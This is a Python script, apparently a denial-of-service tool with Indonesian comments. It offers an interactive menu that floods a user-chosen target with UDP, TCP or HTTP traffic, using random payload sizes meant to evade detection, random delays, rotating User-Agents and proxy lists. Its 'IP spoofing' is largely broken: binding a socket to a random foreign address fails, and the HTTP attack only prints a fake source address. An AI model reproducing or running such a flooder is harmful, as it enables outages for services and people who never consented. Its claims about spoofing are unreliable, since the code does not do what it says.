import os
import socket
import threading
import random
import asyncio
import aiohttp

# Validasi Input
def validate_ip(ip_address):
    """Validate IP address format."""
    try:
        socket.inet_aton(ip_address)
        return True
    except socket.error:
        print("Invalid IP address.")
        return False

def validate_port_range(start, end):
    """Validate port range."""
    if 1 <= start <= 65535 and 1 <= end <= 65535 and start <= end:
        return True
    print("Invalid port range. Ensure ports are between 1 and 65535.")
    return False

# Randomized Data and IP Spoofing
def generate_variable_data():
    """Generate variable-sized random bytes to avoid detection patterns."""
    size = random.randint(512, 8192)  # Random size between 512 and 8192 bytes
    return os.urandom(size)

def random_ip():
    """Generate a valid random IP address, excluding reserved ranges."""
    while True:
        ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        if not ip.startswith(("127.", "10.", "192.168.", "172.")):
            return ip

# UDP Attack with IP Spoofing
async def attack_udp(target_ip, target_port):
    """Perform a randomized UDP attack with IP spoofing."""
    data = generate_variable_data()
    spoofed_ip = random_ip()
    await asyncio.sleep(random.uniform(0.01, 0.3))  # Random delay
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((spoofed_ip, 0))  # Use spoofed IP as source
        sock.sendto(data, (target_ip, target_port))
        print(f"UDP packet sent from {spoofed_ip} to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error sending UDP packet: {e}")

# TCP Attack with IP Spoofing
async def attack_tcp(target_ip, target_port):
    """Perform a randomized TCP attack with IP spoofing."""
    data = generate_variable_data()
    spoofed_ip = random_ip()
    await asyncio.sleep(random.uniform(0.01, 0.3))  # Random delay
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((spoofed_ip, 0))  # Use spoofed IP as source
        sock.connect((target_ip, target_port))
        sock.sendall(data)
        print(f"TCP packet sent from {spoofed_ip} to {target_ip}:{target_port}")
        sock.close()
    except Exception as e:
        print(f"Error sending TCP packet: {e}")

# HTTP Proxy/Direct Attack with IP Spoofing
async def attack_http(target_url, proxy=None):
    """Perform an HTTP attack with optional proxy and IP spoofing."""
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
        ])
    }
    spoofed_ip = random_ip()
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            if proxy:
                proxy_url = f"http://{proxy}"
                async with session.get(target_url, proxy=proxy_url, timeout=5, ssl=False) as response:
                    print(f"Request sent from {spoofed_ip} via proxy {proxy} to {target_url}, Response: {response.status}")
            else:
                async with session.get(target_url, timeout=5, ssl=False) as response:
                    print(f"Direct request sent from {spoofed_ip} to {target_url}, Response: {response.status}")
    except Exception as e:
        print(f"Error sending request to {target_url} ({'Proxy: ' + proxy if proxy else 'Direct'}): {e}")

# Distributed Attack Function
def distributed_attack(target, port, protocol, thread_count, proxies=None):
    """Launch distributed attacks using threads with IP spoofing."""
    async def attack_task():
        tasks = []
        for _ in range(thread_count):
            if protocol == "UDP":
                tasks.append(attack_udp(target, port))
            elif protocol == "TCP":
                tasks.append(attack_tcp(target, port))
            elif protocol == "HTTP":
                proxy = random.choice(proxies) if proxies else None
                tasks.append(attack_http(target, proxy))
        await asyncio.gather(*tasks)

    asyncio.run(attack_task())

# Proxy Loader
def load_proxies(file_path):
    """Load proxies from a file."""
    try:
        with open(file_path, "r") as f:
            proxies = [line.strip() for line in f.readlines()]
            print(f"{len(proxies)} proxies loaded.")
            return proxies
    except FileNotFoundError:
        print("Proxy file not found. Proceeding without proxies.")
        return []

# Main Menu
def menu():
    """Interactive menu for launching attacks or scanning ports."""
    while True:
        print("\= Advanced Script Menu=")
        print("1. UDP Attack with IP Spoofing")
        print("2. TCP Attack with IP Spoofing")
        print("3. HTTP Attack with Optional Proxy")
        print("4. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            target_ip = input("Enter the target IP address: ")
            target_port = int(input("Enter the target port: "))
            thread_count = int(input("Enter the number of threads: "))
            print(f"Launching UDP attack on {target_ip}:{target_port} with {thread_count} threads...")
            distributed_attack(target_ip, target_port, "UDP", thread_count)

        elif choice == "2":
            target_ip = input("Enter the target IP address: ")
            target_port = int(input("Enter the target port: "))
            thread_count = int(input("Enter the number of threads: "))
            print(f"Launching TCP attack on {target_ip}:{target_port} with {thread_count} threads...")
            distributed_attack(target_ip, target_port, "TCP", thread_count)

        elif choice == "3":
            target_url = input("Enter the target URL: ")
            use_proxy = input("Do you have a proxy file? (yes/no): ").lower()
            proxies = []
            if use_proxy == "yes":
                proxy_file = input("Enter the proxy file path: ")
                proxies = load_proxies(proxy_file)
            thread_count = int(input("Enter the number of threads: "))
            print(f"Launching HTTP attack on {target_url} with {thread_count} threads...")
            distributed_attack(target_url, 0, "HTTP", thread_count, proxies if proxies else None)

        elif choice == "4":
            print("Exiting...")
            break
        
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    menu()
